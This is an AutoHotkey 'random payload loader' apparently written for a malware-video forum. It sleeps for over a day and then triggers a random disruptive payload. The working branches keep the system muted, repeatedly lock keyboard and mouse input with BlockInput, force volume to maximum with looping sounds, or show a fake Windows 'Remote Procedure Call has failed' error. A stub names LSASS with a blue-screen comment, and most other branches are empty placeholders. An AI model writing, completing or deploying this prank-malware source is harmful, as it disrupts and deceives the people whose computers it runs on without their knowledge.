;#NoTrayIcon
;#Persistent
DetectHiddenWindows, On
; Random payload loader
; A tiny thing to randomly trigger payloads
; I am a designer, not a programmer, you know...
; (C) 2016 OMFGThor / Goldstar, made for Danooct1 forums
start:
Random, selection, 0, 18
if selection = 0
{
	payloadname := "NoPayload"
	Sleep, 100000000
	MsgBox, 16, DAMN!, You win this time!
	ExitApp
}
Else if selection = 1 ;Aard
{
	payloadname := "MousePush"
		Sleep, 100000000

	}

Else if selection = 2 ;Muter
{
	payloadname := "Mute"
		Sleep, 100000000
	Loop{
	SoundGet, master_mute, , mute
		if master_mute = OFF
			{
				Send {Volume_Mute}
			}
	Else
		SoundSet, 0
	}
}

Else if selection = 3 ;StickyKeys
{
	payloadname := "KeyStick"
		Sleep, 100000000
	Loop{
		Random, dormant, 4500, 10000
		Sleep, %dormant%
		Random, active, 1500, 5000
		BlockInput, On
		Sleep, %active%
		BlockInput, Off
	}
}

Else if selection = 4 ;Louder
{
	payloadname := "Loud"
		Sleep, 100000000
	Loop{
		SoundGet, master_mute, , mute
			if master_mute = ON
			{
				Send {Volume_Mute}
				SoundPlay, *16
			}
		Else
			SoundSet, 100
		Sleep, 100
		}
}

Else if selection = 5 ;Ear Rape 1, Legacy
{
	payloadname := "EarRape1"
		Sleep, 100000000

}

Else if selection = 6 ;Ear Rape 2
{
	payloadname := "EarRape2"
		Sleep, 100000000

}
Else if selection = 7 ;SpamKey
{
	payloadname := "KeySpam"
		Sleep, 100000000

}
Else if selection = 8 ;Annoy
{
	payloadname := "Annoy"
		Sleep, 100000000


}
Else if selection = 9 ;This section might be replaced with NotMyFault, in case if it needs any more blue
{
	payloadname := "LSASS"
		Sleep, 100000000

}
Else if selection = 10
{
	payloadname := "Message"
		Sleep, 100000000
	MsgBox ,16 , Microsoft Windows Operating System, Remote Procedure Call has failed.`nThis action cannot be completed.
	Return
}
Else if selection = 11 ;Insanity
{
	payloadname := "Insanity"
		Sleep, 100000000

}
Else if selection = 12 ;Nava Shield Emulator 2015 
{
	payloadname := "NavaEmul"
		Sleep, 100000000

}
Else if selection = 13
{
	payloadname := "SeizureWindows"
		Sleep, 100000000

}
Else if selection = 14
{
	payloadname := "MusicPlay1"
		Sleep, 100000000

}
Else if selection = 15
{
	payloadname := "MusicPlay2"
		Sleep, 100000000

}
Else if selection = 16
{
	payloadname := "MusicPlay3"
		Sleep, 100000000

}
Else if selection = 17
{
	payloadname := "ShutdownMsg1"
		Sleep, 100000000

}
Else if selection = 18
{
	payloadname := "ShutdownMsg2"
		Sleep, 100000000

}
Else
{
	Sleep, 100000000
ExitApp
}

F12::MsgBox, 16, Debug, CurrentPayload = %selection%, PayloadName = %payloadname%